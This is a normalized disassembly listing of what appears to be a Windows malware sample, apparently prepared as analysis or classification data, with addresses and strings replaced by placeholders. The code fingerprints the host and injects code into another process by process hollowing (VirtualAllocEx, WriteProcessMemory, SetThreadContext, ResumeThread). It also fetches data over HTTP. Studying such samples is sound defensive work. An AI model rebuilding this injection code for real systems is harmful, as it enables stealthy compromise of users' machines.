sub_401000
push ebp
lea ebp [ esp - 0x70 ]
sub esp 0x88
push 0x7f
lea eax [ ebp - 0x17 ]
push 0x0
push eax
call sub_40b0d0
mov eax [ ebp + 0x7c ]
add esp 0xc
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
push esi
push edi
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub eax ecx
mov [ ebp + 0x6c ] eax
movsw [ edi ] [ esi ]
xor eax eax
cmp [ ebp + 0x6c ] eax
movsb [ edi ] [ esi ]
mov [ ebp + 0x68 ] eax
jle r-xdata
mov ecx [ ebp + 0x78 ]
pop edi
mov [ eax + ecx ] 0x0
pop esi
add ebp 0x70
leave
retn
mov esi [ ebp + 0x7c ]
mov edi [ ebp + 0x78 ]
sub edi esi
push ebx
mov eax [ ebp + 0x68 ]
inc eax
mov [ edi + esi ] cl
inc esi
cmp eax [ ebp + 0x6c ]
mov [ ebp + 0x68 ] eax
jl r-xdata
xor cl dl
push 0xa
cdq
pop ebx
idiv ebx
mov cl [ esi ]
mov dl [ ebp + edx - 0x18 ]
cmp cl dl
je r-xdata
pop ebx
sub_401080
push ebp
lea ebp [ esp - 0x6c ]
sub esp 0x84
push esi
push edi
push 0x7f
lea eax [ ebp - 0x17 ]
push 0x0
push eax
call sub_40b0d0
mov esi r--data
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor eax eax
add esp 0xc
movsb [ edi ] [ esi ]
mov [ ebp + 0x68 ] eax
cmp [ ebp + 0x7c ] eax
jbe r-xdata
pop edi
pop esi
add ebp 0x6c
leave
retn
mov esi [ ebp + 0x78 ]
mov edi [ ebp + 0x74 ]
sub edi esi
push ebx
mov eax [ ebp + 0x68 ]
inc eax
mov [ edi + esi ] cl
inc esi
mov [ ebp + 0x68 ] eax
cmp eax [ ebp + 0x7c ]
jb r-xdata
xor edx edx
push 0xa
pop ebx
div ebx
movzx eax cl
mov dl [ ebp + edx - 0x18 ]
movsx ebx dl
cmp eax ebx
je r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
pop ebx
xor cl dl
sub_4010f2
push ebp
mov ebp esp
sub esp 0x20
push ebx
xor eax eax
push esi
push edi
mov [ ebp - 0x10 ] ax
mov [ ebp - 0xe ] ax
mov [ ebp - 0xc ] ax
mov [ ebp - 0xa ] ax
lea eax [ ebp - 0x8 ]
xor ebx ebx
push eax
push ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
call GetAdaptersInfo
cmp eax 0x6f
jne r-xdata
mov esi [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_404e6b
pop ecx
lea ecx [ ebp - 0x8 ]
push ecx
push eax
mov [ ebp - 0x4 ] eax
call GetAdaptersInfo
test eax eax
je r-xdata
mov esi [ esi ]
cmp esi ebx
jne r-xdata
cmp [ eax ] 0x30
jne r-xdata
mov edi [ ebp + 0x8 ]
push [ ebp - 0x4 ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
mov edi [ ebp + 0xc ]
mov esi r--data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsb [ edi ] [ esi ]
call sub_404d8e
pop ecx
jmp r-xdata
lea eax [ esi + 0x1b0 ]
cmp eax ebx
je r-xdata
mov esi [ ebp - 0x4 ]
lea eax [ esi + 0x1b0 ]
lea edx [ ebp - 0x20 ]
sub edx eax
pop edi
pop esi
pop ebx
leave
retn
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
mov edi r--data
push edi
lea eax [ ebp - 0x20 ]
push eax
jmp r-xdata
call sub_405114
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
call sub_404fdc
mov [ ebp + ebx * 2 - 0x10 ] ax
inc ebx
cmp ebx 0x4
pop ecx
jg r-xdata
movzx eax [ esi + 0x199 ]
push eax
movzx eax [ esi + 0x198 ]
push eax
movzx eax [ esi + 0x197 ]
push eax
movzx eax [ esi + 0x196 ]
push eax
movzx eax [ esi + 0x195 ]
push eax
movzx eax [ esi + 0x194 ]
push eax
push r--data
push [ ebp + 0x8 ]
call sub_404c51
movsx eax [ ebp - 0xa ]
push eax
movsx eax [ ebp - 0xc ]
push eax
movsx eax [ ebp - 0xe ]
push eax
movsx eax [ ebp - 0x10 ]
push eax
push r--data
push [ ebp + 0xc ]
call sub_404c51
push [ ebp - 0x4 ]
call sub_404d8e
add esp 0x3c
push edi
push 0x0
sub_40122d
push ebp
lea ebp [ esp - 0x78 ]
sub esp 0xc0
push edi
mov edi 0x9c
push edi
lea eax [ ebp - 0x48 ]
push 0x0
push eax
call sub_40b0d0
add esp 0xc
lea eax [ ebp - 0x48 ]
push eax
mov [ ebp - 0x48 ] edi
call [ GetVersionExA@IAT ]
test eax eax
je r-xdata
pop edi
add ebp 0x78
leave
retn
mov eax [ ebp - 0x44 ]
sub eax 0x4
push ebx
push 0x1
pop ebx
je r-xdata
cmp [ ebp - 0x40 ] 0x5a
sete al
lea eax [ eax * 4 + 0x4 ]
dec eax
je r-xdata
lea ecx [ ebp + 0x54 ]
push ecx
call eax
lea eax [ ebp + 0x54 ]
push eax
call [ GetSystemInfo@IAT ]
jmp r-xdata
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
dec eax
je r-xdata
or [ esi ] bl
cmp [ ebp + 0x54 ] 0x6
jne r-xdata
cmp [ ebp + 0x54 ] 0x9
je r-xdata
cmp [ ebp - 0x40 ] ebx
jne r-xdata
mov [ esi ] 0xc
jmp r-xdata
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
mov [ esi ] 0x0
jmp r-xdata
pop ebx
cmp [ ebp - 0x40 ] 0x2
jne r-xdata
mov [ esi ] 0x10
jmp r-xdata
push 0x9
pop ecx
push r--data
xor eax eax
lea edi [ ebp + 0x54 ]
push r--data
[ edi ]
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x40 ] ebx
jne r-xdata
cmp [ ebp + 0x52 ] bl
setne al
lea eax [ eax * 4 + 0x18 ]
jmp r-xdata
push 0x59
call [ GetSystemMetrics@IAT ]
test eax eax
je r-xdata
cmp [ ebp + 0x52 ] bl
sete al
dec al
and al 0xfd
add al 0x20
jmp r-xdata
mov [ esi ] al
cmp [ ebp + 0x52 ] bl
setne al
dec al
and al 0xfd
add al 0x14
jmp r-xdata
mov [ esi ] 0x15
jmp r-xdata
sub_401339
push ebp
mov ebp esp
mov eax 0x1040
call sub_411780
push ebx
push esi
push edi
push 0xeff
xor ebx ebx
lea eax [ ebp - 0x103b ]
push ebx
push eax
mov [ ebp - 0x103c ] 0x0
call sub_40b0d0
add esp 0xc
mov [ ebp - 0xc ] ebx
cmp [ rw-data ] bl
je r-xdata
push 0x0
push 0x2
call CreateToolhelp32Snapshot
mov [ ebp - 0x8 ] eax
cmp eax 0xffffffff
je r-xdata
lea eax [ ebp - 0x103c ]
mov esi rw-data
mov [ ebp - 0x8 ] eax
mov edi r--data
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x13c ]
push eax
push [ ebp - 0x8 ]
mov [ ebp - 0x13c ] 0x128
call Process32First
jmp r-xdata
add [ ebp - 0x8 ] 0xa0
inc ebx
mov eax ebx
imul eax eax 0x54
lea esi [ eax + rw-data ]
cmp [ esi ] 0x0
mov [ ebp - 0xc ] ebx
jne r-xdata
mov esi [ ebp - 0x8 ]
test eax eax
jne r-xdata
push esi
push esi
call sub_401000
push edi
push esi
call sub_405114
add esp 0x10
test eax eax
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
push edi
push 0x0
call sub_405114
pop ecx
add esi 0x10
pop ecx
test eax eax
jne r-xdata
xor edi edi
cmp [ ebp - 0xc ] edi
jle r-xdata
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
mov edx esi
sub edx eax
lea eax [ ebp - 0x13c ]
push eax
push [ ebp - 0x8 ]
mov [ ebp - 0x13c ] 0x128
call Process32Next
mov eax edi
imul eax eax 0xa0
lea ecx [ ebp + eax - 0x103c ]
mov eax ecx
lea esi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
je r-xdata
inc edi
cmp edi [ ebp - 0xc ]
jl r-xdata
mov eax edi
imul eax eax 0xa0
mov ebx ecx
lea esi [ ebp + eax - 0x103c ]
mov eax [ ebp + 0x8 ]
imul edi edi 0x54
mov ecx [ edi + rw-data ]
or [ eax ] ecx
mov edi [ ebp - 0xc ]
add esi 0x10
mov eax esi
mov ebx esi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
jne r-xdata
lea eax [ ebp - 0x118 ]
push ebx
push eax
call sub_404bff
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
sub_4014b1
push esi
push edi
or edi 0xffffffff
xor esi esi
mov edx eax
and edx 0x1
imul edx edx 0xedb88320
shr eax 0x1
xor eax edx
dec ecx
jne r-xdata
inc esi
not eax
mov edi eax
cmp esi 0x2c
jb r-xdata
mov eax [ esp + 0xc ]
movzx eax [ esi + eax ]
push eax
call sub_4056f3
pop ecx
movzx eax al
push 0x8
xor eax edi
pop ecx
pop edi
pop esi
retn
sub_4014ee
push ebp
mov ebp esp
sub esp 0xc0
xor eax eax
push esi
push edi
mov [ ebp - 0x20 ] 0x0
lea edi [ ebp - 0x1f ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
mov [ ebp - 0x3c ] 0x0
lea edi [ ebp - 0x3b ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
xor eax eax
mov [ ebp - 0x2c ] 0x0
lea edi [ ebp - 0x2b ]
stosd [ edi ]
stosd [ edi ]
stosb [ edi ]
push 0x3f
xor edi edi
lea eax [ ebp - 0xbf ]
push edi
push eax
mov [ ebp - 0xc0 ] 0x0
call sub_40b0d0
mov eax [ ebp + 0x8 ]
add esp 0xc
mov [ ebp - 0x8 ] edi
cmp eax edi
je r-xdata
or eax 0xffffffff
cmp ebx edi
je r-xdata
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
jne r-xdata
mov eax ebx
lea edx [ eax + 0x1 ]
lea esi [ ebp - 0x1 ]
call sub_40122d
cmp [ ebp + 0xc ] edi
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
jne r-xdata
call sub_404030
test eax eax
je r-xdata
or [ ebp - 0x1 ] 0x80
push 0x4
lea eax [ ebp - 0x80 ]
push ebx
push eax
call sub_404ff0
call sub_40557f
cdq
mov ecx 0xffff
idiv ecx
movzx eax dx
push eax
lea eax [ ebp - 0x80 ]
push r--data
push eax
call sub_404c51
jmp r-xdata
movzx eax [ ebp - 0x1 ]
shl eax 0x18
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
call sub_401339
pop ecx
call [ GetSystemDefaultLangID@IAT ]
movzx eax ax
push eax
lea eax [ ebp - 0x2c ]
push r--data
push eax
call sub_404c51
mov eax 0x30303030
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosb [ edi ]
add esp 0xc
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_4010f2
pop ecx
pop ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc0 ]
push eax
mov [ ebp - 0x8 ] 0x40
call [ GetComputerNameA@IAT ]
lea eax [ ebp - 0xc0 ]
lea esi [ eax + 0x1 ]
call [ IsUserAnAdmin@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
mov al [ ebp - 0x80 ]
mov cl [ ebp - 0x7d ]
mov esi [ ebp + 0x8 ]
mov [ ebx ] al
mov al [ ebp - 0x7f ]
mov [ ebx + 0x1 ] al
mov al [ ebp - 0x7e ]
add esp 0xc
mov [ ebx + 0x3 ] cl
mov [ ebx + 0x2 ] al
mov [ ebx + 0x4 ] al
mov eax [ ebx ]
mov [ ebx + 0x5 ] cl
push 0xa
pop ecx
lea edi [ ebp - 0x80 ]
[ edi ] [ esi ]
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x80 ]
push eax
call sub_4014b1
pop ecx
push eax
lea eax [ ebp - 0x80 ]
push r--data
push eax
call sub_404c51
mov al [ ebp - 0x80 ]
mov [ ebx + 0x2 ] al
mov al [ ebp - 0x7f ]
mov [ ebx + 0x3 ] al
mov al [ ebp - 0x7e ]
mov [ ebx + 0x6 ] al
mov al [ ebp - 0x7d ]
mov [ ebx + 0x7 ] al
mov al [ ebp - 0x7c ]
mov [ ebx + 0x8 ] al
mov al [ ebp - 0x7b ]
mov [ ebx + 0x9 ] al
mov al [ ebp - 0x7a ]
mov [ ebx + 0xa ] al
mov al [ ebp - 0x79 ]
add esp 0xc
mov [ ebx + 0xb ] al
xor eax eax
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push 0x8
mov esi eax
pop edi
cmp esi edi
mov [ ebp - 0x8 ] esi
jge r-xdata
or [ ebp - 0x1 ] 0x40
push [ ebp - 0xc ]
lea eax [ ebp - 0x80 ]
push r--data
push eax
call sub_404c51
mov eax [ ebp + 0x8 ]
mov cl [ ebp - 0x80 ]
mov [ eax ] cl
mov cl [ ebp - 0xb9 ]
mov [ eax + 0x1 ] cl
mov cl [ ebp - 0x35 ]
mov [ eax + 0x2 ] cl
mov cl [ ebp - 0x1b ]
mov [ eax + 0x3 ] cl
mov cl [ ebp - 0x1f ]
mov [ eax + 0x4 ] cl
mov cl [ ebp - 0xbd ]
mov [ eax + 0x5 ] cl
mov cl [ ebp - 0x2c ]
mov [ eax + 0x6 ] cl
mov cl [ ebp - 0x79 ]
mov [ eax + 0x7 ] cl
mov cl [ ebp - 0x20 ]
mov [ eax + 0x8 ] cl
mov cl [ ebp - 0x29 ]
mov [ eax + 0x9 ] cl
mov cl [ ebp - 0xbc ]
mov [ eax + 0xa ] cl
mov cl [ ebp - 0x3a ]
mov [ eax + 0xb ] cl
mov cl [ ebp - 0x7b ]
mov [ eax + 0xc ] cl
mov cl [ ebp - 0x1c ]
mov [ eax + 0xd ] cl
mov cl [ ebp - 0x3b ]
mov [ eax + 0xe ] cl
mov cl [ ebp - 0x15 ]
mov [ eax + 0xf ] cl
mov cl [ ebp - 0x7a ]
mov [ eax + 0x10 ] cl
mov cl [ ebp - 0x39 ]
mov [ eax + 0x11 ] cl
mov cl [ ebp - 0xba ]
mov [ eax + 0x12 ] cl
mov cl [ ebp - 0x16 ]
mov [ eax + 0x13 ] cl
mov cl [ ebp - 0xbb ]
mov [ eax + 0x14 ] cl
mov cl [ ebp - 0x1a ]
mov [ eax + 0x15 ] cl
mov cl [ ebp - 0x2b ]
mov [ eax + 0x16 ] cl
mov cl [ ebp - 0xbf ]
mov [ eax + 0x17 ] cl
mov cl [ ebp - 0x38 ]
mov [ eax + 0x18 ] cl
mov cl [ ebp - 0x19 ]
mov [ eax + 0x19 ] cl
mov cl [ ebp - 0x7d ]
mov [ eax + 0x1a ] cl
mov cl [ ebp - 0x1d ]
mov [ eax + 0x1b ] cl
mov cl [ ebp - 0x2a ]
mov [ eax + 0x1c ] cl
mov cl [ ebp - 0x7e ]
mov [ eax + 0x1d ] cl
mov cl [ ebp - 0x37 ]
mov [ eax + 0x1e ] cl
mov cl [ ebp - 0xc0 ]
mov [ eax + 0x1f ] cl
mov cl [ ebp - 0x1e ]
mov [ eax + 0x20 ] cl
mov cl [ ebp - 0x36 ]
mov [ eax + 0x21 ] cl
mov cl [ ebp - 0x7c ]
mov [ eax + 0x22 ] cl
mov cl [ ebp - 0x18 ]
mov [ eax + 0x23 ] cl
mov cl [ ebp - 0x7f ]
add esp 0xc
mov [ eax + 0x24 ] cl
mov cl [ ebp - 0xbe ]
mov [ eax + 0x25 ] cl
mov cl [ ebp - 0x3c ]
mov [ eax + 0x26 ] cl
mov cl [ ebp - 0x17 ]
mov [ eax + 0x27 ] cl
sub edi esi
push edi
lea eax [ ebp + esi - 0xc0 ]
push 0x5f
push eax
call sub_40b0d0
add esp 0xc
add esi edi
mov [ ebp - 0x8 ] esi
mov [ ebp + esi - 0xc0 ] 0x0
sub_401814
push ebp
mov ebp esp
sub esp 0x678
push ebx
push esi
push edi
mov esi 0x103
push esi
xor ebx ebx
lea eax [ ebp - 0x29b ]
push ebx
push eax
mov [ ebp - 0x29c ] 0x0
call sub_40b0d0
push esi
lea eax [ ebp - 0x3a3 ]
push ebx
push eax
mov [ ebp - 0x3a4 ] bl
call sub_40b0d0
push esi
lea eax [ ebp - 0x193 ]
push ebx
push eax
mov [ ebp - 0x194 ] bl
call sub_40b0d0
push 0x44
pop esi
push esi
lea eax [ ebp - 0x8c ]
push ebx
push eax
call sub_40b0d0
xor eax eax
lea edi [ ebp - 0x14 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
push 0x2cc
stosd [ edi ]
lea eax [ ebp - 0x674 ]
push ebx
push eax
call sub_40b0d0
mov eax [ ebp + 0x8 ]
add esp 0x3c
mov [ ebp - 0x8c ] esi
cmp eax ebx
jne r-xdata
lea edx [ ebp - 0x29c ]
sub edx eax
push 0x104
lea eax [ ebp - 0x29c ]
push eax
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call [ GetModuleFileNameA@IAT ]
jmp r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
xor eax eax
mov cl [ ebp + eax - 0x29c ]
mov [ ebp + eax - 0x3a4 ] cl
inc eax
test cl cl
jne r-xdata
lea eax [ ebp - 0x3a4 ]
push eax
call [ PathRemoveFileSpecA@IAT ]
cmp [ ebp + 0x10 ] ebx
je r-xdata
xor eax eax
mov eax [ ebp + 0x10 ]
lea edx [ eax + 0x1 ]
mov cl [ ebp + eax - 0x29c ]
mov [ ebp + eax - 0x194 ] cl
inc eax
test cl cl
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x8c ]
push eax
lea eax [ ebp - 0x3a4 ]
push eax
push ebx
push 0x4
push ebx
push ebx
push ebx
lea eax [ ebp - 0x194 ]
push eax
push ebx
call [ CreateProcessA@IAT ]
push 0x3e8
mov esi eax
call [ Sleep@IAT ]
cmp esi ebx
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
lea eax [ ebp - 0x674 ]
push eax
push [ ebp - 0x10 ]
mov [ ebp - 0x674 ] 0x10007
call [ GetThreadContext@IAT ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0x29c ]
push eax
lea eax [ ebp - 0x194 ]
push r--data
push eax
call sub_404c51
add esp 0x10
jmp r-xdata
push ebx
push 0x4
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x5d0 ]
add eax 0x8
push eax
push [ ebp - 0x14 ]
call [ ReadProcessMemory@IAT ]
test eax eax
jne r-xdata
push 0x1
push [ ebp - 0x14 ]
call [ TerminateProcess@IAT ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push r--data
call [ LoadLibraryA@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
call [ GetLastError@IAT ]
push 0x1
push [ ebp - 0x14 ]
mov esi eax
call [ TerminateProcess@IAT ]
push esi
call [ SetLastError@IAT ]
jmp r-xdata
lea eax [ ebp - 0x194 ]
push r--data
push eax
call sub_401000
pop ecx
pop ecx
lea eax [ ebp - 0x194 ]
push eax
push esi
call [ GetProcAddress@IAT ]
push [ ebp - 0x2c ]
mov [ rw-data ] eax
push [ ebp - 0x14 ]
call eax
test eax eax
je r-xdata
push esi
call [ FreeLibrary@IAT ]
mov eax [ ebp - 0x5c4 ]
mov edi [ VirtualAllocEx@IAT ]
push 0x40
mov ebx 0x3000
push ebx
push 0x20
push eax
push [ ebp - 0x14 ]
mov [ ebp - 0x28 ] eax
call edi
test eax eax
je r-xdata
push 0x1
push [ ebp - 0x14 ]
call [ TerminateProcess@IAT ]
push esi
call [ FreeLibrary@IAT ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov esi [ eax + 0x3c ]
push 0x4
push ebx
add esi eax
push [ esi + 0x50 ]
push [ esi + 0x34 ]
push [ ebp - 0x14 ]
call edi
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
push 0x0
push [ esi + 0x54 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x14 ]
call [ WriteProcessMemory@IAT ]
test eax eax
je r-xdata
and [ ebp - 0x24 ] 0x0
xor ecx ecx
lea eax [ esi + 0xf8 ]
cmp cx [ esi + 0x6 ]
jae r-xdata
mov eax [ ebp - 0x20 ]
push 0x0
mov [ ebp - 0x30 ] eax
push 0x4
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x5d0 ]
add eax 0x8
push eax
push [ ebp - 0x14 ]
mov [ ebp - 0x674 ] 0x10007
call [ WriteProcessMemory@IAT ]
test eax eax
je r-xdata
lea ecx [ eax + 0x8 ]
mov [ ebp - 0x18 ] ecx
lea ecx [ eax + 0x24 ]
lea ebx [ eax + 0xc ]
lea edi [ eax + 0x10 ]
add eax 0x14
mov [ ebp - 0x1c ] ecx
mov [ ebp + 0x8 ] eax
mov ebx [ esi + 0x28 ]
add ebx [ ebp - 0x20 ]
lea eax [ ebp - 0x674 ]
push eax
push [ ebp - 0x10 ]
call [ SetThreadContext@IAT ]
test eax eax
je r-xdata
push 0x28
pop eax
add [ ebp + 0x8 ] eax
add [ ebp - 0x1c ] eax
add [ ebp - 0x18 ] eax
add edi eax
add ebx eax
movzx eax [ esi + 0x6 ]
inc [ ebp - 0x24 ]
cmp [ ebp - 0x24 ] eax
jl r-xdata
test eax eax
je r-xdata
sub ebx [ ebp - 0x28 ]
mov esi r--data
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
push 0x0
movsd [ edi ] [ esi ]
push 0xb
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x28 ]
movsw [ edi ] [ esi ]
push [ ebp - 0x14 ]
movsb [ edi ] [ esi ]
sub ebx 0x5
mov [ ebp - 0x3b ] ebx
call [ WriteProcessMemory@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
add eax [ ebp + 0xc ]
and [ ebp + 0x10 ] 0x0
push 0x0
push [ edi ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x20 ]
push eax
push [ ebp - 0x14 ]
call [ WriteProcessMemory@IAT ]
cmp [ edi ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax 0x40000000
je r-xdata
push [ ebp - 0x10 ]
call [ ResumeThread@IAT ]
mov eax [ ebp - 0x14 ]
test eax eax
jns r-xdata
mov [ ebp + 0x10 ] 0x2
test eax 0x20000000
je r-xdata
mov [ ebp + 0x10 ] 0x4
lea eax [ ebp - 0x40 ]
push eax
push [ ebp + 0x10 ]
mov eax [ ebp - 0x18 ]
push [ eax ]
mov eax [ ebx ]
add eax [ ebp - 0x20 ]
push eax
push [ ebp - 0x14 ]
call [ VirtualProtectEx@IAT ]
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x10
test [ ebp + 0x10 ] 0x4
je r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov [ ebp + 0x10 ] 0x40
jmp r-xdata
mov [ ebp + 0x10 ] 0x20
sub_401c23
push ebp
mov ebp esp
sub esp 0x130
push edi
push 0x0
push 0x2
call CreateToolhelp32Snapshot
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor eax eax
lea eax [ ebp - 0x12c ]
push eax
push edi
mov [ ebp - 0x12c ] 0x128
call Process32First
jmp r-xdata
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x108 ]
push eax
call sub_404bff
pop ecx
pop ecx
test eax eax
je r-xdata
push edi
call [ CloseHandle@IAT ]
push edi
call [ CloseHandle@IAT ]
xor eax eax
inc eax
jmp r-xdata
lea eax [ ebp - 0x12c ]
push eax
push edi
mov [ ebp - 0x12c ] 0x128
call Process32Next
pop edi
leave
retn
sub_401c9e
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ eax ]
mov eax [ ebp + 0xc ]
mov esi [ eax ]
mov ebx [ esi + edi - 0x6 ]
lea eax [ esi - 0x6 ]
cmp eax ebx
jae r-xdata
push ebx
call sub_404e6b
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
sub esi ebx
push ebx
lea ecx [ esi + edi - 0x6 ]
push ecx
push eax
call sub_401080
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_404d8e
mov eax ebx
imul eax eax 0x6
push eax
mov [ ebp - 0x8 ] eax
call sub_404e6b
mov edi eax
add esp 0x14
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
push ebx
push [ ebp - 0x4 ]
lea esi [ ebp - 0x8 ]
push edi
call sub_403d00
add esp 0xc
push [ ebp - 0x4 ]
test eax eax
jge r-xdata
push [ ebp - 0x4 ]
call sub_404d8e
call sub_404d8e
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
mov eax [ ebp - 0x8 ]
pop ecx
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
xor eax eax
call sub_404d8e
push edi
call sub_404d8e
pop ecx
jmp r-xdata
pop ecx
jmp r-xdata
sub_401d4a
push ebp
mov ebp esp
sub esp 0x14
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x10 ] 0x0
push ebx
push esi
push edi
push [ ebp + 0x8 ]
mov edi eax
call sub_4035f2
mov esi eax
test esi esi
jne r-xdata
mov ebx esi
call sub_4036f0
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
xor ebx ebx
push 0x4
xor edi edi
inc ebx
pop eax
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] eax
cmp [ rw-data ] ebx
jne r-xdata
mov edi [ Sleep@IAT ]
push 0x7d0
call edi
call sub_4036f0
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ esi + 0x428 ] ebx
je r-xdata
push edi
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x20000005
push esi
call [ HttpQueryInfoA@IAT ]
jmp r-xdata
push 0x7d0
call edi
call sub_4036f0
test eax eax
jne r-xdata
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] 0x400
mov ecx [ esi + 0x42c ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] edi
jg r-xdata
push esi
call [ InternetCloseHandle@IAT ]
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
mov [ ebp - 0xc ] edi
push ebx
jmp r-xdata
push [ ebp - 0x4 ]
call sub_404e6b
mov ebx eax
pop ecx
cmp ebx edi
je r-xdata
mov edi esi
call sub_403aae
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
jbe r-xdata
call sub_40359a
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov [ eax ] ecx
mov eax ebx
add [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] eax
jl r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0xc ]
sub eax ecx
push eax
add ecx ebx
push ecx
cmp [ ebp - 0x10 ] 0x0
je r-xdata
lea edi [ eax + 0x19000 ]
push edi
push ebx
call sub_40571f
pop ecx
pop ecx
test eax eax
je r-xdata
mov ebx eax
mov eax edi
mov [ ebp - 0x4 ] eax
sub_401e76
push ebp
mov ebp esp
sub esp 0x108
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
xor ebx ebx
push 0x103
mov [ eax ] ebx
lea eax [ ebp - 0x107 ]
push ebx
push eax
mov [ ebp - 0x108 ] bl
call sub_40b0d0
add esp 0xc
lea eax [ ebp - 0x108 ]
push r--data
push eax
call sub_401000
cmp [ rw-data ] 0x1
pop ecx
pop ecx
jne r-xdata
mov edi 0x404
push edi
call sub_404e6b
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x108 ]
push eax
call [ InternetOpenA@IAT ]
mov edi eax
jmp r-xdata
xor eax eax
push edi
push ebx
push esi
call sub_40b0d0
lea eax [ ebp - 0x108 ]
lea ecx [ esi + 0x4 ]
mov edx eax
add esp 0xc
mov [ esi ] ebx
sub ecx edx
cmp edi ebx
jne r-xdata
mov dl [ eax ]
mov [ ecx + eax ] dl
inc eax
cmp dl bl
jne r-xdata
mov edi esi
push r--data
push [ ebp + 0x8 ]
call sub_405114
push r--data
push ebx
call sub_405114
add esp 0x10
cmp eax ebx
jne r-xdata
push eax
call sub_404fdc
pop ecx
push 0x50
pop eax
jmp r-xdata
push [ ebp + 0x10 ]
mov eax esi
push [ ebp + 0xc ]
call sub_401d4a
pop ecx
pop ecx
mov ebx eax
call sub_40359a
jmp r-xdata
xor ebx ebx
push eax
push [ ebp + 0x8 ]
mov ebx edi
